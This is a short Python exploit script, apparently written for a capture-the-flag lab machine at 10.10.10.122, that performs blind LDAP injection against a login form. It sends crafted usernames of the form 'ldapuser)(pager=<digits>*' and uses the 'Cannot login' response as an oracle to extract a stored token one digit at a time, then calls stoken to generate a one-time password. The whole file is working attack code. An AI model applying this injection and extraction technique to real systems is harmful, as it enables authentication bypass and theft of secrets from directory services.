#!/usr/bin/python3



import requests
from time import sleep
import colorama
from colorama import Fore
import string
from string import digits
import os




class exploit: 
	def ldap(self):
		try:
			proxies = {"http": "127.0.0.1:8080"}
			token = ""
			url = "http://10.10.10.122/login.php"
			headers = {"User-Agent": "ldapvuln", "Cookie": "PHPSESSID=92qbh2npe6tfokfn68291namb0", "Content-Type": "application/x-www-form-urlencoded", "Referer": "http://10.10.10.122/login.php"}
			loop = 1
			while loop > 0:
				for num in digits:
					data = f"ldapuser%29%28pager%3d{token}{num}%2a"
					f = { "inputUsername": data, "inputOTP": "1234" }
					r = requests.post(url, headers=headers, data=f, proxies=proxies)
					if "Cannot login" in r.text:
						token = token + num
						print(Fore.GREEN + token)
						sleep(3)
						break
					elif num == "9" and "Cannot login" not in r.text:
						loop=0
						break
		except:
			print(Fore.RED + "Install python3 requests string time colorama")

	

	def get_otp(self):
		try:
			os.system("stoken --token=Your-Token --pin=0000")
		except:
			print(Fore.RED + "Run  sudo apt update && sudo apt install stoken")	

				
			


global pwn
pwn = exploit()
pwn.ldap()			 
